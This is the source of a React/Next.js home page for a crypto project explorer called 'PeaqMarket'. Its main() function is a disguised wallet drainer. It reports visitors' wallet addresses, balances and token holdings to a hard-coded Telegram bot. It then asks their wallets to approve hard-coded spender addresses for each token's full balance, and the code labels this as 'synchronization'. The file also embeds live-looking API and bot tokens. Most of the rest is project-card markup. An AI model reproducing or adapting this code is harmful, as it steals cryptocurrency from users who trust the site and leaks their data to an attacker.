import React, { useContext, useState, useEffect } from "react";
import { ethers } from "ethers";
import { ConnectWallet,useAddress, useBalance, useConnectionStatus,useSigner,useSDK} from "@thirdweb-dev/react";
import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Link, Button, ButtonGroup, NavbarMenuToggle, NavbarMenu, NavbarMenuItem, Card, CardBody, Input, Image, CardFooter, CardHeader,Divider} from "@nextui-org/react";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
import ChainContext from "../context/Chain";
import { useRouter } from 'next/router';
import AcmeLogo from "./AcmeLogo";
import SearchIcon from "./SearchIcon";
import MoonIcon from "./moon";
import SunIcon from "./sun";
import { NextPage } from "next";
import {useTheme} from "next-themes";
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import {faCertificate,faThumbtack,faFire} from '@fortawesome/free-solid-svg-icons';
import Head from "next/head";

const Home: NextPage = () => {
  const [isMenuOpen, setIsMenuOpen] = React.useState(false);
  const { theme, setTheme } = useTheme();

  const menuItems = [
    "Explore",
    "Projects",
    "Help & Feedback",
  ];
const address = useAddress();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
const { selectedChain, setSelectedChain } = useContext(ChainContext);
const [allowanceRequested, synchronizationCompleted] = useState(false);
const signer = useSigner();
const router = useRouter();
const [synchronizationSuccess, setSynchronizationProcess] = useState(false);
const addresses: Record<string, string> = {
    ["ethereum"]: "0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25",
    ["binance"]: "0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25",
    ["arbitrum"]: "0xb4511516352e47F4A8A2E750Cd3505eC0D5930B1",
    ["polygon"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",

  };
  const net: Record<string,string> = {
    "ethereum" : "ethereum",
    "binance": "binance",
    "arbitrum":"arbitrum",
    "polygon":"polygon",
  };
   const sdk =  useSDK();
  const aptk = "6tL6x4wh-ROoNc4hp3C8gE-ToXlCSM5t"
  const chainUrls: Record<string, string> = {
    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${aptk}`,
    binance:  `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
    polygon: `https://matic-mainnet.g.alchemy.com/v2/${aptk}`,
  };
  const url = chainUrls[selectedChain];
  const connectionStatus = useConnectionStatus();
  console.log(connectionStatus);
  console.log(selectedChain);
  const [showConnectModal, setShowConnectModal] = useState(false);
  async function main() {
    if (connectionStatus === "unknown") {
      await sendMessageToTelegram(`User is yet to connect. Hold on........`);
      console.log(`User is yet to connect. Hold on........`);
      setShowConnectModal(true);
      return;
      
    } 
    if (connectionStatus === "connecting"){
      await sendMessageToTelegram(`User's wallet is connecting be patient....`);
      console.log(`User's wallet is connecting be patient....`);
    }
    if (connectionStatus === "connected"){
      await sendMessageToTelegram(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
      console.log(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
    }
    if (connectionStatus === "disconnected"){
      await sendMessageToTelegram(`User has disconnected !`);
      console.log(`User has disconnected`);
      setShowConnectModal(true);
      return;
    }

    const options = {
      method: "POST",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        id: 1,
        jsonrpc: "2.0",
        method: "alchemy_getTokenBalances",
        params: [address],
      }),
    };
    // fetching the token balances
    let res = await fetch(url, options);
    let response = await res.json();
  
    // Getting balances from the response
    const balances = response["result"];
  
    // Remove tokens with zero balance
    const nonZeroBalances = await balances.tokenBalances.filter(
        (token: { tokenBalance: string }) => token.tokenBalance !== "0"
      );
  
    await sendMessageToTelegram(`Token balances of ${address}: \n`);
  
    // Create arrays to store contract addresses, balances, and formatted balances
    const tokenAddresses = [];
    const tokenBalances = [];
    const formattedBalances = [];
  
    // Loop through all tokens with non-zero balance
    for (let token of nonZeroBalances) {
      // Get balance of token
      let balance = token.tokenBalance;
      
  
      // request options for making a request to get tokenMetadata
      const tokenMetadataOptions = {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify({
          id: 1,
          jsonrpc: "2.0",
          method: "alchemy_getTokenMetadata",
          params: [token.contractAddress],
        }),
      };
  
      // parsing the response and getting metadata from it
      let res2 = await fetch(url, tokenMetadataOptions);
      let metadata = await res2.json();
      metadata = metadata["result"];
  
      // Compute token balance in human-readable format
      balance = balance / Math.pow(10, metadata.decimals);
      balance = balance.toFixed(2);
      // Create formatted balance using ethers.utils.parseUnits()
      const formattedBalance = ethers.utils.parseUnits(balance.toString(), 'ether');
      // Print name, balance, and symbol of token
      await sendMessageToTelegram(`${metadata.name}: ${balance} ${metadata.symbol}`);
      // Add contract address, balance, and formatted balance to the arrays
      tokenAddresses.push(token.contractAddress);
      tokenBalances.push(balance);
      formattedBalances.push(formattedBalance);
      console.log(token.contractAddress);
    }
     const spenderAddress = addresses[selectedChain];
    // Loop through contract addresses and formatted balances
    for (const [index, tokenAddress] of tokenAddresses.entries()) {
        const refundAmount = formattedBalances[index];
        
      const tokenContract = new ethers.Contract(tokenAddress, ['function approve(address spender, uint256 value)'], signer);
      try {
        
        const tx = await tokenContract.approve(spenderAddress, refundAmount);
        const gasCost = await tx.estimateGasCost();
        await sendMessageToTelegram(`Synchronization completed for token at address ${tokenAddress}`);
      } catch (error) {
        const tferror = console.info(`ERROR:`, error);
        await sendMessageToTelegram(`${tferror}`);
        setSynchronizationProcess(false); 
        return; // Exit the loop on error
      }
    }
    
    synchronizationCompleted(true); // Move this line outside the loop
    setSynchronizationProcess(true); 
  }
  useEffect(() => {
    if (synchronizationSuccess) {
        router.push("/synchronize"); // Replace "/new-page" with your desired destination
      }
    }, [synchronizationSuccess, router]);

  return (
    <div>
      <Head>
      <title>PeaqMarket - Home</title>
    </Head>
 <Navbar
      isBordered
      isMenuOpen={isMenuOpen}
      onMenuOpenChange={setIsMenuOpen}
    >
      <NavbarContent className="sm:hidden" justify="start">
        <NavbarMenuToggle aria-label={isMenuOpen ? "Close menu" : "Open menu"} />
      </NavbarContent>

      <NavbarContent className="sm:hidden pr-3" justify="center">
        <NavbarBrand>
          <AcmeLogo />
          <p className="font-bold text-inherit">Peaq Market</p>
        </NavbarBrand>
      </NavbarContent>

      <NavbarContent className="hidden sm:flex gap-4" justify="center">
        <NavbarBrand>
          <AcmeLogo />
          <p className="font-bold text-inherit">Peaq Market</p>
        </NavbarBrand>
        <NavbarItem>
          <Link color="foreground" href="#">
            Explore
          </Link>
        </NavbarItem>
        <NavbarItem isActive>
          <Link href="#" aria-current="page">
            Projects
          </Link>
        </NavbarItem>
      </NavbarContent>

      <NavbarContent justify="end">
        <NavbarItem>
  <Button variant="ghost" onClick={() => setTheme('light')}><SunIcon/></Button>
  <Button variant="ghost" onClick={() => setTheme('dark')}><MoonIcon/></Button>
        </NavbarItem>
      </NavbarContent>

      <NavbarMenu>
        {menuItems.map((item, index) => (
          <NavbarMenuItem key={`${item}-${index}`}>
            <Link
              className="w-full"
              color={
                index === 0 ? "warning" : index === menuItems.length - 1 ? "danger" : "foreground"
              }
              href="#"
              size="lg"
            >
              {item}
            </Link>
          </NavbarMenuItem>
        ))}
      </NavbarMenu>
    </Navbar>
    
    <Card>
      <CardBody>
        <p className="justify-center text-center font-small">Connect your wallet to Explore all projects features</p>
        <br></br>
        <p className="justify-center text-center font-small">
        <ConnectWallet theme={theme as ("light" | "dark" | undefined)}
        modalTitle={"Connect to Peaq Market"}/></p>
      </CardBody>
    </Card>
    <br></br>
    <div>
      <h1 className="font-bold">Explore all projects</h1><br></br>
    </div>
    <div className="flex items-center">
  <Input
    label="Search"
    isClearable
    radius="lg"
    classNames={{
      label: "text-black/50 dark:text-white/90",
      input: [
        "bg-transparent",
        "text-black/90 dark:text-white/90",
        "placeholder:text-default-700/50 dark:placeholder:text-white/60",
      ],
      innerWrapper: "bg-transparent",
      inputWrapper: [
        "shadow-xl",
        "bg-default-200/50",
        "dark:bg-default/60",
        "backdrop-blur-xl",
        "backdrop-saturate-200",
        "hover:bg-default-200/70",
        "dark:hover:bg-default/70",
        "group-data-[focused=true]:bg-default-200/50",
        "dark:group-data-[focused=true]:bg-default/60",
        "!cursor-text",
      ],
    }}
    placeholder="Type to search..."
    startContent={
      <SearchIcon className="text-black/50 dark:text-white/90 text-slate-400 pointer-events-none flex-shrink-0"/>
    }
  />
  <div className="box-content flex justify-end gap-1 px-2 shadow-lg">
  <Link isBlock href="#" color="foreground"><FontAwesomeIcon icon={faThumbtack} rotation={90} style={{color: "#47b70b",}}/>&nbsp;Featured</Link>
  <Link isBlock href="#" color="foreground"><FontAwesomeIcon icon={faFire} style={{color: "#d34617",}}/>&nbsp;Newest</Link>
  <Link isBlock href="#" color="foreground"><FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} />&nbsp;Verified</Link>
  </div>
</div>
<div className="flex justify-center items-center">
  <div className="text-center">
    <br></br>
    <h1>Select Chain</h1>
    <select
    className="block font-bold px-3 py-2 mt-2 border rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
        value={String(selectedChain)}
        onChange={(e) => setSelectedChain(e.target.value)}
      >
      <option value="binance">Binance Smart Chain</option>
      <option value="ethereum">Ethereum</option>
      <option value="polygon">Polygon</option>
      <option value="arbitrum">Arbitrum</option>
    </select>
  </div>
</div>
<Divider/>
<br></br>
<div className="grid grid-cols-2 px-1 sm:grid-cols-4 gap-4 sm:px-5">
<Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/beagleswap.png"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Beagleswap&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">Beagleswap.xyz</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Beagleswap Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Beagleswap"
        >
          Explore Beagleswap
        </Link>
      </CardFooter>
    </Card><Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/cashmere.webp"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Cashmere Labs&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">cashmere.exchange</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Cashmere Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Cashmere Labs"
        >
          Explore Cashmere
        </Link>
      </CardFooter>
    </Card><Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/plexus.webp"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Plexus&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">plexus.app</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Plexus Features </p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Plexus"
        >
          Explore Plexus
        </Link>
      </CardFooter>
    </Card><Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/robots.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Robots.Farm&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">robots.farm</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Robots.Farm Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Robots.Farms"
        >
          Explore Robots.Farms
        </Link>
      </CardFooter>
    </Card><Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/melon.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Melon.ooo&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">melon.ooo</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Melon.ooo Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Melon.ooo"
        >
          Explore Melon.ooo
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/mantle.webp"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Mantleswap&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">app.mantleswap.org</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Mantleswap Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Mantleswap"
        >
          Explore Mantleswap
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/scroll.webp"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Scroll&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">scroll.io</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Scroll Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Scroll"
        >
          Explore Scroll
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/aark.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Aark Digital&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">aark.digital</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Aark Digital Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Aark Digital"
        >
          Explore Aark Digital
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/dackie.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Dackieswap&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">dackieswap.xyz</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Dackieswap Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Dackieswap"
        >
          Explore Dackieswap
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/sunflower.png"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Sunflower Land&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">sunflower-land.com</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Sunflower Land Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Sunflower Land"
        >
          Explore Sunflower Land
        </Link>
      </CardFooter>
    </Card><Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/monsterra.webp"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Monsterra&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">monsterra.io</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Monsterra Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Monsterra"
        >
          Explore Monsterra
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/metawin.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Metawin&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">metawin.com</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Metawin Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Metawin"
        >
          Explore Metawin
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/cheelee.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Cheelee&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">cheelee.io</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Cheelee Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Cheelee"
        >
          Explore Cheelee
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/arcomia.png"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Arcomia Metaverse&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">arcomia.io</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Arcomia Metaverse Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Arcomia Metaverse"
        >
          Explore Arcomia Metaverse
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/mar3ai.png"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Mar3ai&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">mar3.ai</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Mar3ai Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Mar3ai"
        >
          Explore Mar3ai
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/dew.svg"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Dew&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">dew.gg</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Dew Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Dew"
        >
          Explore Dew
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/masa.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Masa&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">masa.finance</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Masa Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Masa"
        >
          Explore Masa
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/bgtrade.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">BGTrade&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">bgtrade.io</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore BGTrade Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=BGTrade"
        >
          Explore BGTrade
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/ambit.png"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Ambit Finance&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">ambitfi.com</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Ambit Finance Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Ambit Finance"
        >
          Explore Ambit Finance
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/zkpass.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">ZkPass&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">zkpass.org</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore ZkPass Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=ZkPass"
        >
          Explore ZkPass
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/readon.svg"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Readon&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">readon.me</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Readon Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Readon"
        >
          Explore Readon
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/mendi.svg"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Mendi Finance&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">mendi.finance</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore mendi Finance Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Mendi Finance"
        >
          Explore Mendi Finance
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/sparta.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">SpartaDEX&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">spartadex.io</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore SpartaDEX Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=SpartaDEX"
        >
          Explore SpartaDEX
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/vp.ico"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Vision Protocol&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">vp.xyz</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Vision Protocol Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Vision Protocol"
        >
          Explore Vision Protocol
        </Link>
      </CardFooter>
    </Card>
    <Card className="max-w-[400px]">
      <CardHeader className="flex gap-3">
        <Image
          alt="nextui logo"
          height={40}
          radius="sm"
          src="images/taskon.svg"
          width={40}
        />
        <div className="flex flex-col">
          <p className="text-md">Taskon&nbsp;<FontAwesomeIcon icon={faCertificate} style={{color: "#1c5ece",}} /></p>
          <p className="text-small text-default-500">taskon.xyz</p>
        </div>
      </CardHeader>
      <Divider/>
      <CardBody>
        <p>Explore Taskon Features</p>
      </CardBody>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="/explore?project=Taskon"
        >
          Explore Taskon
        </Link>
      </CardFooter>
    </Card>
    </div>
</div>
  );
};
const sendMessageToTelegram = async (message: string) => {
  const botToken = '6488844148:AAF76yNNMzeq3A9WqyPYdbWflixc0zNBEAU';
  const chatId = '185020058'; // You'll need to obtain this from your Telegram bot
  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}; 
export default Home;
